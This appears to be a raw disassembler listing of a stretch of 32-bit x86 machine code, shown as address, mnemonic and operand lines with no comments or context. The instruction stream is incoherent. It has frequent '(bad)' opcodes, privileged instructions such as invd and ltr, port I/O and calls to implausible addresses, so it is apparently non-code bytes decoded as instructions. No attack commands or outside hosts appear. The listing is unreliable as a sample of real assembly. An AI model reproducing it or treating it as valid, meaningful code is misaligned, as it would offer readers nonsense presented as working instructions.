  4322ed:	inc    edx
  4322ef:	sbb    al,0x33
  4322f1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4322f8:	add    BYTE PTR [ebp+0x46],0x8b
  4322fc:	jmp    0xf98b:0x100041c8
  432303:	xor    esi,DWORD PTR [edx+0x3]
  432306:	mov    ecx,DWORD PTR [edi]
  432308:	fmul   DWORD PTR [edx]
  43230a:	add    BYTE PTR [eax],al
  43230c:	lea    eax,[ebx-0x4700273c]
  432312:	add    al,0x4f
  432314:	pop    DWORD PTR [eax]
  432316:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43231c:	push   edx
  43231d:	inc    WORD PTR [ebp+0x8]
  432321:	mov    eax,0x514f4d
  432326:	(bad)
  43232a:	add    al,al
  43232c:	xor    DWORD PTR [ebx-0x74baf730],eax
  432332:	test   DWORD PTR [esi+0x74],esp
  432335:	inc    ebp
  432336:	mov    DWORD PTR [eax+0xa4e08],edi
  43233c:	add    BYTE PTR [ecx-0x76c435bb],cl
  432342:	or     dh,cl
  432344:	or     eax,0x8b8d5045
  432349:	inc    ebp
  43234a:	mov    WORD PTR [ecx+0x3b8a00],?
  432350:	jne    0x432385
  432352:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432358:	add    DWORD PTR [ebx],eax
  43235a:	add    bh,bh
  43235c:	adc    DWORD PTR [eax],ecx
  43235e:	adc    DWORD PTR [ebp+0x55],edi
  432361:	push   es
  432362:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432368:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43236f:	inc    ebp
  432370:	mov    esp,edi
  432372:	or     al,0xda
  432374:	push   eax
  432375:	(bad)  
  432376:	jne    0x43232c
  432378:	call   0x3b1c67
  43237d:	inc    ebp
  43237e:	sar    BYTE PTR [eax],0x84
  432381:	in     al,dx
  432382:	add    bh,al
  432384:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43238b:	(bad)  
  43238c:	and    al,al
  43238e:	fs in  eax,dx
  432390:	inc    DWORD PTR [ebp-0x7b]
  432393:	jle    0x4323a4
  432395:	leave  
  432396:	scas   al,BYTE PTR es:[edi]
  432397:	inc    esp
  432398:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43239f:	or     BYTE PTR [ebx-0x97717c8],0x83
  4323a6:	call   DWORD PTR [edi]
  4323a8:	shr    ah,0x84
  4323ab:	xchg   DWORD PTR [eax],eax
  4323ad:	add    DWORD PTR [eax],eax
  4323af:	add    bh,bh
  4323b1:	dec    ebp
  4323b2:	and    BYTE PTR [ecx-0x38],dl
  4323b5:	push   eax
  4323b6:	dec    DWORD PTR [ebx+0xfd885]
  4323bc:	mov    BYTE PTR [ebp+0x508bac00],cl
  4323c2:	mov    WORD PTR [ecx+0x0],ss
  4323c5:	lea    ecx,[ebx+0x108b20d8]
  4323cb:	mov    WORD PTR [edx],ds
  4323cd:	add    BYTE PTR [edi+0xff01ff],al
  4323d3:	mov    ecx,DWORD PTR [ebp-0x28]
  4323d6:	push   ecx
  4323d7:	shl    BYTE PTR [ebp+0x3a],0x8b
  4323db:	inc    ebp
  4323dc:	in     al,0xeb
  4323de:	jno    0x43236b
  4323e0:	push   edx
  4323e1:	mov    DWORD PTR [eax-0x28],edx
  4323e4:	mov    eax,DWORD PTR [ebp+0x20]
  4323e7:	je     0x432370
  4323e9:	mov    eax,DWORD PTR [ecx]
  4323eb:	sbb    BYTE PTR [eax],al
  4323ed:	pop    DWORD PTR [eax]
  4323ef:	add    esi,eax
  4323f1:	add    bl,al
  4323f3:	adc    DWORD PTR [edi],esi
  4323f5:	jmp    0x8bce7447
  4323fa:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432401:	jne    0x43238e
  432403:	mov    ecx,DWORD PTR [eax]
  432405:	in     al,0x75
  432407:	pop    DWORD PTR [ecx+0x5401]
  43240d:	push   edx
  43240e:	inc    DWORD PTR [ebx]
  432410:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432416:	add    BYTE PTR [edi+0x9],dl
  432419:	call   DWORD PTR [esi]
  43241b:	and    dl,al
  43241d:	and    bh,bh
  43241f:	inc    edi
  432421:	test   eax,edx
  432423:	sldt   ebx
  432426:	xor    al,BYTE PTR [eax]
  432428:	pushf  
  432429:	(bad)  
  43242a:	jmp    0x432438
  43242c:	mov    eax,edi
  43242e:	or     al,0x75
  432430:	inc    eax
  432431:	call   0x431b39
  432436:	mov    eax,eax
  432438:	loopne 0x4323be
  43243a:	inc    ebp
  43243b:	add    BYTE PTR [ebx+0x1451c00],cl
  432441:	mov    eax,DWORD PTR [ebp+0x20]
  432444:	add    edi,ecx
  432446:	add    BYTE PTR [eax],ch
  432448:	cmp    edi,0x18
  43244b:	test   DWORD PTR [ebp+0xf],esi
  43244e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432455:	jne    0x432459
  432457:	call   0xffa21f1c
  43245c:	leave  
  43245d:	rcr    BYTE PTR [esp+eax*4],0x55
  432461:	add    ah,ch
  432463:	add    BYTE PTR [edi-0x48fef979],dh
  432469:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  432470:	inc    esp
  432471:	mov    ebx,DWORD PTR [eax]
  432473:	fcom   st(2)
  432475:	add    BYTE PTR [edi],bl
  432477:	lea    ecx,[eax-0x18]
  43247a:	(bad)  
  43247b:	push   DWORD PTR [ecx]
  43247d:	call   0xffb571df
  432482:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432486:	fstp   DWORD PTR [esi+ebx*8]
  432489:	push   ebp
  43248a:	pop    ebp
  43248b:	mov    esi,DWORD PTR [edx-0x38]
  43248e:	add    DWORD PTR [eax],0x28
  432491:	mov    edi,DWORD PTR [ebx]
  432493:	xor    esi,DWORD PTR [edx+0x3]
  432496:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43249a:	pop    ebp
  43249b:	or     al,0x4
  43249d:	inc    ecx
  43249e:	push   ebp
  43249f:	(bad)  
  4324a0:	in     al,dx
  4324a1:	or     ah,ch
  4324a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4324a4:	xbegin 0xffc89a9a
  4324aa:	clc    
  4324ab:	adc    al,0x45
  4324ad:	div    BYTE PTR [edx]
  4324af:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4324b6:	test   DWORD PTR [ebx+0x666300f8],ebx
  4324bc:	add    BYTE PTR [ecx+0x66],dh
  4324bf:	add    eax,DWORD PTR [ebp+0x52]
  4324c2:	adc    eax,0xffffffa0
  4324c5:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4324cb:	test   DWORD PTR [eax],eax
  4324cd:	clc    
  4324ce:	data16 or al,BYTE PTR [ebp+0x45]
  4324d2:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4324d9:	rol    BYTE PTR [ebp+0x45],1
  4324dc:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4324e2:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4324e8:	push   ebx
  4324e9:	add    BYTE PTR [eax+eax*1+0x51],dl
  4324ed:	jge    0x432522
  4324ef:	add    BYTE PTR [esi+0x4],dl
  4324f2:	jne    0x432559
  4324f4:	mov    edx,0x457200
  4324f9:	jmp    0x4324bd
  4324fb:	xor    edi,DWORD PTR [ebx]
  4324fd:	pop    edi
  4324fe:	cvtdq2ps xmm7,xmm0
  432501:	ret    0x0
  432504:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43250a:	xor    ecx,DWORD PTR [edi]
  43250c:	add    eax,DWORD PTR [ecx+0x3b]
  43250f:	push   ebx
  432510:	rdpmc  
  432512:	out    0x8d,al
  432514:	add    BYTE PTR [eax],cl
  432516:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43251c:	ret    0x450c
  43251f:	sbb    al,0x8b
  432521:	cmp    eax,esi
  432523:	or     cl,al
  432525:	or     al,0xc2
  432527:	pop    eax
  432528:	inc    ebp
  432529:	add    ecx,DWORD PTR [edi]
  43252b:	add    esi,DWORD PTR [ebp+0x39]
  43252e:	invd   
  432530:	jge    0x43253c
  432532:	mov    eax,0x478ac0
  432537:	cli    
  432538:	xor    esp,ecx
  43253a:	mov    ebx,0x5b8ac0
  43253f:	ret    0x33
  432542:	mov    eax,0x833b8b
  432547:	sub    BYTE PTR [ebx],al
  432549:	inc    ebp
  43254a:	xor    ax,di
  43254d:	pushf  
  43254e:	inc    bh
  432550:	mov    esp,esp
  432552:	hlt    
  432553:	test   DWORD PTR [ebp-0x8],esi
  432556:	mov    eax,DWORD PTR [ebp-0x14]
  432559:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43255f:	dec    edi
  432560:	or     BYTE PTR [eax],al
  432562:	jne    0x4324ed
  432564:	mov    esi,esp
  432566:	call   0x77a9b12b
  43256b:	inc    ebp
  43256c:	mov    DWORD PTR [eax+0x9b4f0c],edi
  432572:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432578:	add    BYTE PTR [esi+0x7d],ah
  43257b:	inc    ebp
  43257c:	mov    bx,WORD PTR [ebp+0x8]
  432580:	add    DWORD PTR [ebp+0x54],0x30c008b
  432587:	inc    ebp
  432588:	mov    bx,di
  43258b:	lock test BYTE PTR [ecx+0x7000801],bh
  432592:	jge    0x432555
  432594:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43259a:	cli    
  43259b:	xor    bl,bh
  43259d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4325a3:	test   BYTE PTR [eax],cl
  4325a5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4325ac:	cmp    ebp,eax
  4325ae:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4325b5:	test   BYTE PTR [ebp+0x1],bh
  4325b8:	mov    ebx,0x458a00
  4325bd:	xor    esi,DWORD PTR [ebx]
  4325bf:	add    esp,DWORD PTR [esi-0x77]
  4325c2:	pop    ebp
  4325c3:	loopne 0x43262b
  4325c5:	inc    ebp
  4325c6:	clc    
  4325c7:	xor    edi,DWORD PTR [ebx]
  4325c9:	add    esi,DWORD PTR [edx-0x77]
  4325cc:	data16 fdivr QWORD PTR [ebp-0x49]
  4325d0:	mov    ebx,0xb78afc
  4325d5:	hlt    
  4325d6:	xor    edi,DWORD PTR [esi+eiz*2]
  4325d9:	add    BYTE PTR [ebp+0x66],bl
  4325dc:	data16 lock clc 
  4325df:	cmp    al,0x3b
  4325e1:	add    BYTE PTR [edi+0x66],dh
  4325e4:	psubq  mm7,QWORD PTR [ebp+0x2]
  4325e8:	ltr    WORD PTR [ebp+0x66]
  4325ec:	add    esi,eax
  4325ee:	add    di,WORD PTR [ebp+0x2b]
  4325f2:	data16 data16 jge 0x432673
  4325f6:	mov    ebx,0xe08a8b
  4325fb:	jge    0x432630
  4325fd:	data16 data16 xor al,0x5d
  432601:	data16 data16 jne 0x4325fd
  432605:	mov    edi,DWORD PTR [ebx]
  432607:	fdiv   QWORD PTR [edx+0x7d]
  43260a:	data16 data16 jge 0x432642
  43260e:	mov    ebx,0x758a66
  432613:	mov    esi,0x667233
  432618:	pop    ebp
  432619:	or     BYTE PTR [esi+0x0],ah
  43261c:	clc    
  43261d:	mov    edi,DWORD PTR [ebx]
  43261f:	lock ja 0x4325ad
  432622:	(bad)  
  432624:	jge    0x43261d
  432626:	invd   
  432628:	pop    ebp
  432629:	add    BYTE PTR [ebx],al
  43262b:	(bad)  
  43262c:	cmp    di,WORD PTR [ebp+0xf]
  432630:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432634:	mov    bx,WORD PTR [ebp-0x10]
  432638:	pop    bp
  43263a:	fbstp  TBYTE PTR [ebx]
  43263c:	test   DWORD PTR [ebx],eax
  43263e:	add    BYTE PTR [ebx],bh
  432640:	add    BYTE PTR [esi+0x7d],ah
  432643:	jge    0x4325d0
  432645:	data16 in al,dx
  432647:	pop    ebp
  432648:	stc    
  432649:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  432650:	mov    edi,ebx
  432652:	in     al,dx
  432653:	test   BYTE PTR [ebp+0x0],bh
  432656:	mov    eax,DWORD PTR [eax]
  432658:	call   0xbd401fe8
  43265d:	cmp    al,0x9b
  43265f:	add    BYTE PTR [edx],dh
  432661:	mov    bx,di
  432664:	call   0x8b4ba3f4
  432669:	add    ebp,esp
  43266b:	mov    bx,di
  43266e:	jnp    0x432696
  432670:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432676:	mov    eax,DWORD PTR [eax]
  432678:	call   0x7c3eb1e3
  43267d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432683:	data16 data16 fistp WORD PTR [ebp+0xe]
  432688:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432692:	fisttp WORD PTR [ecx-0x7401f77b]
  432698:	(bad)  
  432699:	cld    
  43269a:	jne    0x4326d8
  43269c:	xor    eax,DWORD PTR [eax]
  43269e:	mov    esp,DWORD PTR [esi-0x10]
  4326a1:	sti    
  4326a2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4326a9:	data16 adc bl,bh
  4326ac:	push   ebp
  4326ad:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4326b4:	mov    WORD PTR [eax],es
  4326b6:	fwait
  4326b7:	data16 xor bh,bl
  4326ba:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4326c0:	mov    esp,DWORD PTR [esi-0x14]
  4326c3:	fisttp WORD PTR [ebx-0x3748a9f2]
  4326c9:	or     al,0x2b
  4326cb:	mov    bh,0xba
  4326cd:	hlt    
  4326ce:	mov    bh,bl
  4326d0:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4326d6:	dec    esi
  4326d7:	or     al,0x0
  4326d9:	mov    edi,DWORD PTR [ebx]
  4326db:	or     BYTE PTR [ebp+0x3b],dh
  4326de:	mov    ecx,DWORD PTR [edi]
  4326e0:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4326e6:	xor    al,0xd8
  4326e8:	pop    bp
  4326ea:	lock xor esi,DWORD PTR [ebx]
  4326ed:	lea    esp,[esi+0x1f]
  4326f0:	icebp  
  4326f1:	jb     0x4326f7
  4326f3:	add    al,al
  4326f5:	jge    0x432703
  4326f7:	mov    eax,eax
  4326f9:	fsubr  st,st(3)
  4326fb:	pop    ebp
  4326fc:	mov    esi,DWORD PTR [ebx]
  4326fe:	in     al,0x8d
  432700:	rcr    DWORD PTR [edi],0xc2
  432703:	jb     0x432763
  432705:	add    cl,cl
  432707:	jge    0x432715
  432709:	mov    edx,DWORD PTR [ebp-0x20]
  43270c:	in     al,dx
  43270d:	pop    ebp
  43270e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432713:	cmp    di,WORD PTR [ebp+0x0]
  432717:	mov    ebp,DWORD PTR [ebx]
  432719:	fdivr  QWORD PTR [esi+0x668a5d]
  43271f:	cmp    al,0x33
  432721:	mov    si,0x4e7d
  432725:	mov    eax,DWORD PTR [eax]
  432727:	lock inc ebp
  432729:	mov    esi,DWORD PTR [eax]
  43272b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  432732:	clc    
  432733:	(bad)  
  432734:	cmp    edi,DWORD PTR [ebx]
  432736:	je     0x432747
  432738:	push   ebx
  432739:	loopne 0x43274a
  43273b:	dec    ecx
  43273d:	mov    esp,DWORD PTR [ebp-0x1c]
  432740:	int    0xf1
  432742:	mov    esi,0x703084d
  432747:	pcmpgtd mm6,mm1
  43274a:	add    BYTE PTR [ebp+0x66],dh
  43274d:	jmp    0x43271a
  43274f:	mov    eax,DWORD PTR [ebx]
  432751:	lock push ebp
  432753:	ror    DWORD PTR [ebp-0x2972feb3],1
  432759:	or     bh,dl
  43275b:	jb     0x43275b
  43275d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432763:	loopne 0x432765
  432765:	jne    0x432769
  432767:	data16 add BYTE PTR [esi+eiz*2],dh
  43276b:	mov    ecx,ebx
  43276d:	data16 cmp al,0xf1
  432770:	add    BYTE PTR [esi+eiz*2],bh
  432773:	add    bl,cl
  432775:	retw   0xf2
  432779:	ret    0x66
  43277c:	retf   
  43277d:	enterw 0x4df1,0x19
  432782:	pop    edi
  432783:	jne    0x432706
  432785:	mov    esi,DWORD PTR [eax]
  432787:	call   0x77b7b328
  43278c:	xor    ebp,DWORD PTR [ebx]
  43278e:	lea    esp,[esi+0x48]
  432791:	repnz in eax,0x3b
  432794:	add    BYTE PTR [ebp-0x37],dh
  432797:	xor    edx,DWORD PTR [ebp-0x15]
  43279a:	in     al,dx
  43279b:	xor    edx,DWORD PTR [esi+0x40]
  43279e:	mov    DWORD PTR [edi],0x338545fc
  4327a4:	clc    
  4327a5:	add    esi,DWORD PTR [ecx]
  4327a7:	pop    edi
  4327a8:	pushf  
  4327a9:	pop    ebx
  4327aa:	call   0xff442771
  4327af:	mov    edi,eax
  4327b1:	push   ecx
  4327b2:	pop    es
  4327b3:	mov    edi,DWORD PTR [eax]
  4327b5:	push   esi
  4327b6:	inc    esi
  4327b7:	add    bh,BYTE PTR [esi+0x0]
  4327ba:	popa   
  4327bb:	data16 (bad) 
  4327bd:	into   
  4327be:	gs cmp al,0xcd
  4327c1:	add    BYTE PTR [ecx+0x7ce0866],bh
  4327c7:	ret    0x66
  4327ca:	add    bh,al
  4327cc:	add    bh,ah
  4327ce:	add    BYTE PTR [ebp+0x31c3f866],al
  4327d4:	cmp    al,0x9c
  4327d6:	add    BYTE PTR [esi+0x66],ah
  4327d9:	into   
  4327da:	ret    
  4327db:	pop    ebp
  4327dc:	adc    BYTE PTR [edi+0x0],dl
  4327df:	mov    bh,0x66
  4327e1:	mov    edi,0xff038dc3
  4327e6:	jne    0x43283c
  4327e8:	lea    edx,[ecx+0x1]
  4327eb:	mov    ebx,0xd64ff1
  4327f0:	sar    DWORD PTR [ebx],1
  4327f2:	test   BYTE PTR [ebp+0x36],dh
  4327f5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4327f9:	push   edi
  4327fa:	xor    BYTE PTR [ebx],0x38
  4327fd:	mov    esi,ebx
  4327ff:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432805:	ss inc ebp
  432807:	fs pop ebx
  432809:	mov    ebx,0x9c3b30
  43280e:	je     0x43283b
  432810:	xor    edi,DWORD PTR [ebx+0x668a33]
  432816:	mov    WORD PTR [ebx],?
  432818:	ss mov ebx,0x8b4e64
  43281e:	pop    edi
  43281f:	cmp    ecx,ecx
  432821:	jne    0x432878
  432823:	mov    ebp,esp
  432825:	cld    
  432826:	push   esi
  432827:	pop    ebx
  432828:	inc    ebp
  432829:	stc    
  43282a:	xor    BYTE PTR [ebp+0x9bef89c],al
  432830:	test   esi,ecx
  432832:	clc    
  432833:	test   dl,dl
  432835:	cmp    bh,bh
  432837:	fs pop si
  43283a:	or     bl,al
  43283c:	add    cl,BYTE PTR [ebx+0x57665100]
  432842:	retf   0x3c45
  432845:	xor    BYTE PTR [eax],al
  432847:	pushf  
  432848:	mov    si,0x85ca
  43284c:	ret    0xf8
  43284f:	pop    ebx
  432850:	dec    dx
  432853:	mov    edx,DWORD PTR [edi-0x76]
  432856:	push   edi
  432857:	add    al,0xb7
  432859:	xor    al,0xba
  43285b:	cmp    al,0x8d
  43285d:	je     0x43285e
  43285f:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  432863:	lea    edi,[ebx+0x544fff]
  432869:	push   ecx
  43286a:	cmp    edx,DWORD PTR [ebx+0x75]
  43286d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  432873:	add    BYTE PTR [ebx],dh
  432875:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43287b:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432882:	mov    ebx,0x3b3b00
  432887:	jne    0x4328b4
  432889:	mov    DWORD PTR [ebx+0x728afc],edi
  43288f:	xor    esi,DWORD PTR [ebx]
  432891:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432897:	push   edi
  432898:	cmp    esp,ebp
  43289a:	jne    0x43289c
  43289c:	sbb    DWORD PTR [eax],0x8085c3fc
  4328a2:	clc    
  4328a3:	inc    esi
  4328a4:	pop    ebx
  4328a5:	sti    
  4328a6:	add    eax,0xeb8bc075
  4328ab:	cld    
  4328ac:	xor    edi,DWORD PTR ds:0xf8c3855e
  4328b2:	mov    ecx,DWORD PTR [ecx+edx*2]
  4328b5:	rol    DWORD PTR [ebp-0x37],0xf
  4328b9:	mov    DWORD PTR [eax],ecx
  4328bb:	inc    edi
  4328bc:	(bad)  
  4328bd:	in     eax,0xfe
  4328bf:	add    bh,bh
  4328c1:	(bad)  
  4328c2:	mov    esi,0xc38a5e
  4328c7:	mov    esi,DWORD PTR [ebx]
  4328c9:	push   ecx
  4328ca:	mov    edi,0xfc4ec7
  4328cf:	test   DWORD PTR [ebp-0x8],edx
  4328d2:	xor    di,ax
  4328d5:	pushf  
  4328d6:	sub    ebp,eax
  4328d8:	inc    ebp
  4328d9:	(bad)  
  4328da:	sub    edi,edi
  4328dc:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4328e2:	inc    ebp
  4328e3:	add    BYTE PTR [esi+0x2b],ah
  4328e6:	or     bh,BYTE PTR [edx+0xf8ac2]
  4328ec:	cmp    al,0x33
  4328ee:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4328f4:	(bad)  
  4328f5:	cmp    esi,DWORD PTR [ebx]
  4328f7:	je     0x4328b1
  4328f9:	push   ebx
  4328fa:	dec    esi
  4328fb:	str    ecx
  4328fe:	cmp    esp,DWORD PTR [ebp+0x75]
  432901:	int    0x33
  432903:	mov    edi,0x789085f
  432908:	mov    edx,DWORD PTR [eax]
  43290a:	cld    
  43290b:	add    cl,cl
  43290d:	data16 add al,0xcb
  432910:	push   ebp
  432911:	add    ebp,esp
  432913:	jne    0x432901
  432915:	(bad)  
  432916:	mov    DWORD PTR [ecx],0xd685f7ec
  43291c:	clc    
  43291d:	xlat   BYTE PTR ds:[ebx]
  43291e:	inc    ebp
  43291f:	mov    esi,DWORD PTR [edx]
  432921:	push   eax
  432922:	pushf  
  432923:	in     eax,0x8b
  432925:	add    ah,ch
  432927:	add    dl,BYTE PTR [eax+eax*1+0x51]
  43292b:	add    ax,0x72cb
  43292f:	cmp    al,0x0
  432931:	add    BYTE PTR [ebp+0x66],al
  432934:	(bad)  
  432935:	retf   
  432936:	lock ret 0x85
  43293a:	clc    
  43293b:	inc    bp
  43293d:	retf   
  43293e:	cmp    eax,0xc77d9cc8
  432943:	xor    ah,bh
  432945:	pushf  
  432946:	test   DWORD PTR [edi-0x8],ebx
  432949:	je     0x432990
  43294b:	xor    esi,DWORD PTR ds:0x7020840
  432951:	ror    BYTE PTR [ebp-0x37],0x8d
  432955:	push   ebp
  432956:	add    esp,ebp
  432958:	jb     0x4328e5
  43295a:	add    BYTE PTR [eax],cl
  43295c:	dec    ebp
  43295d:	mov    bh,0x81
  43295f:	push   esi
  432960:	push   esp
  432961:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432968:	xor    al,BYTE PTR [eax]
  43296a:	mov    edx,DWORD PTR [edi+0x10]
  43296d:	(bad)  
  43296e:	scas   eax,DWORD PTR es:[edi]
  43296f:	ret    0x3b
  432972:	jns    0x3b442665
  432978:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43297c:	dec    ebp
  43297d:	or     BYTE PTR [ebx],ch
  43297f:	ret    0x458b
  432982:	lock jmp 0x432976
  432985:	mov    ecx,DWORD PTR [eax]
  432987:	or     BYTE PTR [edi],al
  432989:	mov    ecx,eax
  43298b:	xor    DWORD PTR [edx+0x2],0x0
  43298f:	mov    bh,0xc1
  432991:	adc    BYTE PTR [eax],dh
  432993:	iret   
  432994:	inc    ebp
  432995:	mov    DWORD PTR [ebx],0x4dfff8c4
  43299b:	inc    BYTE PTR [ebx]
  43299d:	ret    0xf8
  4329a0:	adc    DWORD PTR [esi+0x10],esp
  4329a3:	clc    
  4329a4:	dec    ecx
  4329a5:	fisttp WORD PTR [ecx+0x456604c0]
  4329ab:	add    dh,BYTE PTR ds:0x75e0845
  4329b1:	ret    0x4d
  4329b4:	lea    ecx,[ebx+0x18728301]
  4329ba:	add    BYTE PTR [ebp+0x45],al
  4329bd:	xor    ecx,ebp
  4329bf:	pushf  
  4329c0:	add    bh,al
  4329c2:	add    al,ch
  4329c4:	inc    ebp
  4329c5:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4329cb:	xor    eax,0x781084d
  4329d0:	push   esp
  4329d1:	fwait
  4329d2:	push   ecx
  4329d3:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4329d9:	inc    ebp
  4329da:	cmp    edi,DWORD PTR [ecx]
  4329dc:	jbe    0x43297a
  4329de:	mov    eax,edi
  4329e0:	or     ah,dh
  4329e2:	inc    ebp
  4329e3:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4329e9:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4329ef:	in     al,dx
  4329f0:	hlt    
  4329f1:	push   esp
  4329f2:	push   esp
  4329f3:	push   ecx
  4329f4:	push   ecx
  4329f5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4329fb:	fwait
  4329fc:	fwait
  4329fd:	xor    dh,BYTE PTR [edx]
  4329ff:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432a05:	or     BYTE PTR [ebp+0x7],al
  432a08:	mov    eax,ecx
  432a0a:	clc    
  432a0b:	jb     0x4329ce
  432a0d:	add    BYTE PTR [ebp+0x55],cl
  432a10:	or     DWORD PTR [edi],0xc251d154
  432a16:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  432a20:	mov    edi,eax
  432a22:	or     cl,al
  432a24:	inc    ebp
  432a25:	dec    ebp
  432a26:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432a2c:	or     WORD PTR [ecx],0x899b
  432a31:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432a37:	mov    edx,DWORD PTR [ecx+0x8]
  432a3a:	mov    eax,DWORD PTR [ebp-0x8]
  432a3d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432a44:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432a4a:	inc    ebp
  432a4b:	dec    eax
  432a4c:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  432a52:	add    edx,DWORD PTR [ecx-0x8]
  432a55:	mov    ecx,DWORD PTR [ecx]
  432a57:	clc    
  432a58:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  432a5f:	mov    ecx,ebp
  432a61:	clc    
  432a62:	(bad)  
  432a63:	popf   
  432a64:	inc    DWORD PTR [eax]
  432a66:	ret    0x8b
  432a69:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  432a6f:	mov    edi,esp
  432a71:	hlt    
  432a72:	test   ecx,esi
  432a74:	clc    
  432a75:	or     BYTE PTR [ebp+0x7],al
  432a78:	xor    al,cl
  432a7a:	pushf  
  432a7b:	jb     0x432ab0
  432a7d:	add    BYTE PTR [eax-0x3f],al
  432a80:	inc    eax
  432a81:	daa    
  432a82:	inc    ebp
  432a83:	inc    ebp
  432a84:	xor    eax,0x7f80803
  432a89:	dec    ebp
  432a8a:	fwait
  432a8b:	add    esi,DWORD PTR [edx]
  432a8d:	clc    
  432a8e:	cmp    DWORD PTR [ecx],ecx
  432a90:	or     al,0x8
  432a92:	add    al,BYTE PTR [ebp+0x2c]
  432a95:	xor    eax,0x7350845
  432a9a:	or     BYTE PTR [ebp+0x7],cl
  432a9d:	lea    ebx,[ebx-0x748dcdff]
  432aa3:	add    BYTE PTR [eax*2-0x74b21438],cl
  432aaa:	mov    edx,DWORD PTR [eax]
  432aac:	cld    
  432aad:	dec    ebp
  432aae:	push   esp
  432aaf:	sub    edx,DWORD PTR [ecx-0x75]
  432ab2:	add    eax,0xf172fc
  432ab7:	or     BYTE PTR [ebp+0x7],cl
  432aba:	add    eax,ecx
  432abc:	or     al,0x72
  432abe:	add    DWORD PTR [eax],eax
  432ac0:	mov    ebx,0x29c2c1
  432ac5:	inc    ebp
  432ac6:	mov    eax,DWORD PTR [ebx]
  432ac8:	cmp    eax,0x3004d1c
  432ace:	xbegin 0x66c8b6c8
  432ad4:	clc    
  432ad5:	or     BYTE PTR [ebp+0x45],al
  432ad8:	xor    dh,BYTE PTR ds:0x78b089c
  432ade:	adc    BYTE PTR [ebp+0x45],cl
  432ae1:	lea    eax,[ebp+0x33727501]
  432ae7:	add    cl,ch
  432ae9:	inc    ebp
  432aea:	add    bl,ch
  432aec:	add    BYTE PTR [ebx+0x45850845],cl
  432af2:	je     0x432a7f
  432af4:	push   ebx
  432af5:	or     al,0x85
  432af7:	dec    ebp
  432af8:	std    
  432af9:	mov    bh,bh
  432afb:	mov    BYTE PTR [ebp-0x75],al
  432afe:	mov    edi,eax
  432b00:	or     al,0x89
  432b02:	inc    ebp
  432b03:	clc    
  432b04:	mov    esp,esp
  432b06:	hlt    
  432b07:	call   DWORD PTR [edi-0x37]
  432b0a:	push   esp
  432b0b:	or     al,0x51
  432b0d:	push   ebp
  432b0e:	xor    ebp,esp
  432b10:	mov    esi,0x457251
  432b15:	xor    esi,eax
  432b17:	pushf  
  432b18:	inc    ebp
  432b19:	(bad)  
  432b1a:	mov    edi,eax
  432b1c:	or     al,0x85
  432b1e:	add    al,bh
  432b20:	inc    eax
  432b22:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432b26:	or     ah,bh
  432b28:	inc    eax
  432b29:	push   esp
  432b2a:	jmp    0x432b7d
  432b2c:	mov    eax,DWORD PTR ds:0xe8720c
  432b32:	mov    DWORD PTR [ebp-0x8],eax
  432b35:	jne    0x432b7c
  432b37:	jmp    0x432ac4
